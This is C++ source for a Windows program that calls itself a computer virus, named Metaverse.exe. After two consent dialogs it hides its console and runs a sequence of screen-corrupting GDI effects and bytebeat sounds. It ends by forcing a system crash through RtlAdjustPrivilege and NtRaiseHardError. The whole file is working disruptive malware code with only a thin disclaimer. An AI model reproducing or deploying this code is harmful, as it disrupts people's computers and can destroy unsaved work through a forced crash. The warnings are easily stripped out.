#include<stdio.h>
#include<windows.h>
#include<shlobj.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include"resource.h"
#define PI acos(-1.0)
#define SLEEP_TIME 1000
#define PI 3.14159265358979323846264338327950288
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")
extern "C" WINBASEAPI HWND WINAPI GetConsoleWindow ();
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

COLORREF fe(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

VOID WINAPI Rsod(){
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc=GetDC(NULL);
	HBITMAP bmp=LoadBitmap(GetModuleHandle(NULL),(char*)IDB_RSOD);
	HDC bmpdc=CreateCompatibleDC(hdc);
	HGDIOBJ oldbmp=SelectObject(bmpdc,bmp);
	StretchBlt(hdc,0,0,w,h,bmpdc,0,0,640,480,SRCCOPY);
	SelectObject(bmpdc,oldbmp);
	DeleteObject(bmp);
	DeleteDC(bmpdc);
}
VOID WINAPI sound1(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>( t * ( t >> ( t >> 13 & t ) ) );
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI DrawCur(LPVOID lparam){
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	while (1) {
		DrawIcon(hdc,rand()%w, rand()%h, LoadCursor(NULL,IDC_ARROW));
		Sleep(10);
	}
}
DWORD WINAPI RotateScreen(LPVOID lparam){
	int a=2;
	for(;;){
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        POINT pos[3];
        pos[0].x = 0, pos[0].y = 0;
        pos[1].x = cos(a * (PI / 180)) * w, pos[1].y = sin(a * (PI / 180)) * w;
        pos[2].x = (-1) * (sin(a * (PI / 180)) * h), pos[2].y = cos(a * (PI / 180)) * h;
        PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
        ReleaseDC(0,hdc);
        DeleteObject(hdc);
    }
}

DWORD WINAPI ColorfulScreen(LPVOID lparam){
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rect;
	GetWindowRect(hwnd,&rect);
	while (1) {
		//BitBlt(hdc,0,0,rect.right,rect.bottom,hdc,0,0,3342348);
		SelectObject(hdc,CreateSolidBrush(RGB(rand()%256,(rand() / 2) % 256,(rand() / 2) % 256)));
		PatBlt(hdc,0,0,rect.right,rect.bottom,PATINVERT);
		Sleep(100);
	}
}

VOID WINAPI sound2(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>(t*t/(1+(t>>9&t>>8))&128);
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI MENZTunnels(LPVOID lparam){
	HWND hwnd=GetDesktopWindow();
	HDC hdc=GetWindowDC(hwnd);
	RECT rect;
	GetWindowRect(hwnd,&rect);
	while (1) {
		int rands=rand()%10-5;
		StretchBlt(hdc,rect.left+10+rands,rect.top+10+rands,rect.right-20,rect.bottom-20,hdc,rect.left,rect.top,rect.right,rect.bottom,SRCCOPY);
		Sleep(100);
	}
}
VOID WINAPI sound3(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>( t * ( t >> ( t >> 13 & t ) ) );
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI RotateScreen2(LPVOID lparam){
	while(1){
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
    	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        POINT pos[3];
        pos[0].x = h / 40, pos[0].y = h / 40;
        pos[1].x = w -  (h / 40), pos[1].y = 0;
        pos[2].x = h / 40, pos[2].y = h;
		PlgBlt(hcdc, pos, hcdc, 0, 0, w, h, 0, 0, 0);
    	SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
    	PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
	}
}
VOID WINAPI sound4(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>(t * ((t >> 5) + 20 | t >> 13)) >> (t >> 14);
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI FenXingSanJiao(LPVOID lpParam) {

	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x | y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	Sleep(50);
}

DWORD WINAPI PieRectangles(LPVOID lparam){
	HDC hdc=GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while(1){
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        switch(rand()%3){
            case 0:
                Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
            case 1:
                Ellipse(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
            case 2:
                Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
        }
		Sleep(10);
	}
}
DWORD WINAPI TextBall(LPVOID lpParam){
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCWSTR lpText = L"Metaverse.exe";
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetTextColor(hdc, fe(239));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI sound5(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>((t & ((t >> 18) + ((t >> 11) & t))) * t + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI Moire(LPVOID lpParam) {
	HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdc = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x*y);
		}
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
}
DWORD WINAPI Ball(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	for (;;) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(fe(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 15] = {0};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t&t>>12)*(t>>4|t>>8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI Mohu(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 10, rand() % 10, sw, sh, hdc, rand() % 10, rand() % 10, SRCINVERT);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
VOID WINAPI sound7(){
	HWAVEOUT hWaveOut=0;
	WAVEFORMATEX wfx={WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
	waveOutOpen(&hWaveOut,WAVE_MAPPER,&wfx,0,0,CALLBACK_NULL);
	char buffer[8000*15]={0};
	for(DWORD t=0;t<sizeof(buffer);++t){
		buffer[t]=static_cast<char>(t^t>>12)*(t>>8);
	}
	WAVEHDR header={buffer,sizeof(buffer),0,0,0,0,0,0};
	waveOutPrepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutWrite(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut,&header,sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI Melt(LPVOID lpParam){
	for (;;){
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
    	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    	for(int y = 0; y <= h; y++){
            BitBlt(hcdc, 10 * ((rand() % 5) - 3), y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
    }
}
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI FanseCircle(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {0};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 6 | t >> 12) & 15 & t >> 9)) * t >> 10;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI ScreenWind(LPVOID lparam){
	for (int t = 0;; t++) {
		HDC hdc = GetDC(NULL);
    	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
    	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    	BLENDFUNCTION blf = { 0 };
    	blf.BlendOp = AC_SRC_OVER;
    	blf.BlendFlags = 0;
    	blf.SourceConstantAlpha = 128;
    	blf.AlphaFormat = 0;
    	AlphaBlend(hdc, 0 + t % 200 + 10, 0 - t % 25, w, h, hcdc, 0, 0, w, h, blf);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(20);
	}
	return 0;
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 15] = {0};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t ^ t >> 11) * (t | t >> 4) & (t | t << 114) + (t | t >> 51))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
DWORD WINAPI HuaPing(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
void CrashWindows() {
    HMODULE hNtdll = LoadLibrary("ntdll.dll");
    VOID(WINAPI *RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(WINAPI*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(WINAPI *NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(WINAPI*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
    
    unsigned char unused1;
    long unsigned int unused2;

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(0x13, true, false, &unused1);
        NtRaiseHardError(0xc0114514, 0, 0, 0, 6, &unused2);
    }

    FreeLibrary(hNtdll);
}
VOID WINAPI RunPayload1(){
	sound1();
	//HANDLE rotate=CreateThread(NULL,0,RotateScreen,NULL,0,NULL);
	//HANDLE fanse=CreateThread(NULL,0,ScreenFanSe,NULL,0,NULL);
	//Sleep(15000);
	//TerminateThread(rotate,0);
	//TerminateThread(fanse,0);
	HANDLE cur=CreateThread(NULL,0,DrawCur,NULL,0,NULL);
	HANDLE colorful=CreateThread(NULL,0,ColorfulScreen,NULL,0,NULL);
	Sleep(5000);
	HANDLE rotate=CreateThread(NULL,0,RotateScreen,NULL,0,NULL);
	Sleep(10000);
	TerminateThread(rotate,0);
	//SendMessage(FindWindow("SysListView32",NULL),WM_ERASEBKGND,0,0);
	//RedrawWindow(NULL,NULL,NULL,RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	Sleep(SLEEP_TIME);
	sound2();
	HANDLE tunnel=CreateThread(NULL,0,MENZTunnels,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(colorful,0);
	TerminateThread(tunnel,0);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	//SendMessage(hShell,WM_COMMAND,(WPARAM)419,0);
	//KillProcessByName("explorer.exe");
	Sleep(SLEEP_TIME);
	sound3();
	HANDLE rotate2=CreateThread(NULL,0,RotateScreen2,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(rotate2,0);
	TerminateThread(cur,0);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	Sleep(SLEEP_TIME);
	sound4();
	HANDLE fenxingsanjiao=CreateThread(NULL,0,FenXingSanJiao,NULL,0,NULL);
	HANDLE pie=CreateThread(NULL,0,PieRectangles,NULL,0,NULL);
//	HANDLE tball=CreateThread(NULL,0,TextBall,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(fenxingsanjiao,0);
	TerminateThread(pie,0);
//	TerminateThread(tball,0);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	Sleep(SLEEP_TIME);
	sound5();
	HANDLE moire=CreateThread(NULL,0,Moire,NULL,0,NULL);
	HANDLE ball=CreateThread(NULL,0,Ball,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(moire,0);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	Sleep(SLEEP_TIME);
	sound6();
	HANDLE mohu=CreateThread(NULL,0,Mohu,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(ball,0);
	TerminateThread(mohu,0);
	SHChangeNotify(SHCNE_ASSOCCHANGED,SHCNF_IDLIST,NULL,NULL);
	Sleep(SLEEP_TIME);
	Rsod();
}
void RunPayloadFinal(){
	sound7();
	HANDLE tball=CreateThread(NULL,0,TextBall,NULL,0,NULL);
	HANDLE melt=CreateThread(NULL,0,Melt,NULL,0,NULL);
	HANDLE fsci=CreateThread(NULL,0,FanseCircle,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(tball,0);
	TerminateThread(melt,0);
	TerminateThread(fsci,0);
	Rsod();
	Sleep(SLEEP_TIME);
	sound8();
	tball=CreateThread(NULL,0,TextBall,NULL,0,NULL);
	HANDLE wind=CreateThread(NULL,0,ScreenWind,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(tball,0);
	TerminateThread(wind,0);
	Rsod();
	Sleep(SLEEP_TIME);
	sound9();
	HANDLE hp=CreateThread(NULL,0,HuaPing,NULL,0,NULL);
	Sleep(15000);
	TerminateThread(hp,0);
	CrashWindows();
}
int main(){
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	if(MessageBoxW(NULL,L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\n\nPlease don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Metaverse.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2)==IDYES){
		if (MessageBoxW(NULL, L"This is the last warning!!!\n\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Metaverse.exe -- WARNING", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES){
			srand(time(NULL));
			HMODULE hModUser32 = LoadLibrary((char *)"user32.dll");
			BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
			if (SetProcessDPIAware){
				SetProcessDPIAware();
			}
			FreeLibrary(hModUser32);
			RunPayload1();
			Sleep(1000);
			RunPayloadFinal();
			//Sleep(1000);
			//MessageBox(NULL,"End!","Metaverse.exe",MB_OKCANCEL);
		}
	}
	return 0;
}